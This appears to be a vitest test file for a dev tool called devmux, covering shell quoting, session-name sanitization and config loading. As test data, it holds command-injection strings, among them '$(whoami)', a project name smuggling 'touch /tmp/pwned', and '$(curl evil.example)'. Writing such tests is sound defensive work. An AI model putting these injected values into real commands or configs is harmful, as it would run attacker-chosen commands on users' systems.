import { describe, it, expect } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { shellQuote } from "../utils/exec.js";
import { loadConfig, getSessionName } from "../config/loader.js";

describe("shellQuote", () => {
  it("passes hostile strings through a real shell unchanged", () => {
    const hostile = [
      `plain`,
      `has spaces`,
      `semi;colon`,
      `dollar$(whoami)`,
      `back\`tick\``,
      `single'quote`,
      `double"quote`,
      `newline\nvalue`,
    ];
    for (const value of hostile) {
      const out = execFileSync("sh", ["-c", `printf %s ${shellQuote(value)}`], {
        encoding: "utf-8",
      });
      expect(out).toBe(value);
    }
  });
});

describe("session name sanitization", () => {
  const baseConfig = (project: string, extra: object = {}) => ({
    version: 1,
    project,
    services: { api: { cwd: ".", command: "echo ok", ...extra } },
  });

  function resolveInTemp(config: object): string {
    const dir = mkdtempSync(join(tmpdir(), "devmux-test-"));
    try {
      writeFileSync(join(dir, "devmux.config.json"), JSON.stringify(config));
      const resolved = loadConfig(dir);
      return getSessionName(resolved, "api");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  }

  it("strips shell metacharacters from config-derived session names", () => {
    const name = resolveInTemp(baseConfig(`evil"; touch /tmp/pwned; "`));
    expect(name).toMatch(/^[A-Za-z0-9_-]+$/);
  });

  it("strips metacharacters from explicit sessionName overrides", () => {
    const name = resolveInTemp({
      version: 1,
      project: "ok",
      services: {
        api: { cwd: ".", command: "echo ok", sessionName: "$(curl evil.example)" },
      },
    });
    expect(name).toMatch(/^[A-Za-z0-9_-]+$/);
  });

  it("uses the devmux- prefix by default", () => {
    const name = resolveInTemp(baseConfig("myapp"));
    expect(name).toBe("devmux-myapp-api");
  });
});

describe("config discovery", () => {
  it("finds config in ancestor directories", () => {
    const root = mkdtempSync(join(tmpdir(), "devmux-walk-"));
    try {
      writeFileSync(
        join(root, "devmux.config.json"),
        JSON.stringify({
          version: 1,
          project: "walkup",
          services: { api: { cwd: ".", command: "echo ok" } },
        }),
      );
      const nested = join(root, "a", "b", "c");
      mkdirSync(nested, { recursive: true });
      const resolved = loadConfig(nested);
      expect(resolved.project).toBe("walkup");
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

describe("config validation", () => {
  it("rejects services with a missing command", () => {
    const dir = mkdtempSync(join(tmpdir(), "devmux-invalid-"));
    try {
      writeFileSync(
        join(dir, "devmux.config.json"),
        JSON.stringify({ version: 1, project: "x", services: { api: { cwd: "." } } }),
      );
      expect(() => loadConfig(dir)).toThrow(/"command" must be a non-empty string/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
